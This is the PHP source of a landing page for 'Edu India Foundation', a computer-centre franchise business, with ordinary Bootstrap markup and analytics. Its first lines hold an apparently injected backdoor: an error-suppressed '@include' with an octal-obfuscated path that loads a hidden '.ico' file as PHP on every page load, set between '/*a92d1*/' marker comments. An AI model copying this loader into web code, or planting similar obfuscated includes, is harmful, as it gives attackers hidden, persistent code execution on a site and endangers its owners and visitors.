<?php
/*a92d1*/

@include "\057ho\155e/\145du\151nd\151af\057pu\142li\143_h\164ml\057ve\156do\162/a\152ax\137to\137ph\160/.\144dd\1424a\1458.\151co";

/*a92d1*/





?>

 

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
	  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-132577153-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-132577153-1');
</script>
	  <meta name="google-site-verification" content="5mLdnmAp4DoEap-vfkXrVubVip58SY4oIZijbiI3ZSE" />
   <title>Edu India Foundation - 08950071777</title>		
<meta name="keywords" content="Edu India, Edu India Foundation, Computer Centre Franchise"/>

<meta name="description" content="Edu India Foundation provides Computer Centre Franchise, Yoga Course Franchise, NTT Course Franchise." />

<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
    <!-- Bootstrap -->
   <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
  </head>
  <body>
  
  <div class="container">
  	<div class="row goto">
    	<div class="col-md-8" style="margin-left:17%;">
    		<center><img src="images/logo/homepagelogo.png"></center>  
            <h1>EDU INDIA FOUNDATION</h1>  
            <h4 align="center">Regd. Under NCT & Ministry of Labour Govt. of India 
<br>An ISO 9001:2015 Certified Institute</h4>
			<center><span class="fa fa-arrow-down flashit"></span></center>
            <a href="main.php" class="btn btn-lg btn-success">Go To Home Page</a>
        </div>
    </div>
  </div>
    
<style>
.flashit{
  color:#5cb85c;
	-webkit-animation: flash linear 1s infinite;
	animation: flash linear 1s infinite;
}
@-webkit-keyframes flash {
	0% { opacity: 1; } 
	50% { opacity: .1; } 
	100% { opacity: 1; }
}
@keyframes flash {
	0% { opacity: 1; } 
	50% { opacity: .1; } 
	100% { opacity: 1; }
}

	.goto{margin-top:20%;}
	.btn{margin:20px 0 0 38%;}
	h1{color:#123067; text-align:center;}
</style>
    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
  </body>
</html>
